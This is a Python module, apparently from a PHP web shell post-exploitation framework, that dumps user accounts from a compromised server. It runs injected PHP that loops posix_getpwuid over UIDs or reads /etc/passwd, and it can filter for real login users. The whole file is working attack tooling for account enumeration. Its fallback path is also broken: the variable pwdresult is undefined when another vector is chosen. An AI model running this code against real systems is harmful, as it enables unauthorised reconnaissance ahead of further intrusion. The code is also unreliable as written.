from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
from core.module import Module
from core import modules

class Etcpasswd(Module):

    """Get /etc/passwd with different techniques."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([
            { 'name' : '-real', 'help' : 'Filter only real users', 'action' : 'store_true', 'default' : False },
            { 'name' : '-vector', 'choices' : ( 'posix_getpwuid', 'file', 'fread', 'file_get_contents', 'base64' ) }
        ])

    def run(self, args):

        if args.get('vector', 'posix_getpwuid') == 'posix_getpwuid':
            pwdresult = PhpCode("""for($n=0; $n<2000;$n++) { $uid = @posix_getpwuid($n); if ($uid) echo join(':',$uid).PHP_EOL;  }""").run(args)

        if not pwdresult:
            arg_vector = [ '-vector', args.get('vector') ] if args.get('vector') else []
            pwdresult = ModuleExec('file_read', [ '/etc/passwd' ] + arg_vector).run()

        if not pwdresult: return

        result = ''
        for line in pwdresult.split('\n'):
            fields = line.split(':')
            if len(fields) > 6:
                uid = int(fields[2])
                shell = fields[6]

                if (
                    args.get('real') and (
                        (uid == 0 or uid > 999) and
                        'false' not in shell
                        )
                    or not args.get('real')
                    ):
                    result += line + '\n'

        return result.rstrip('\n')
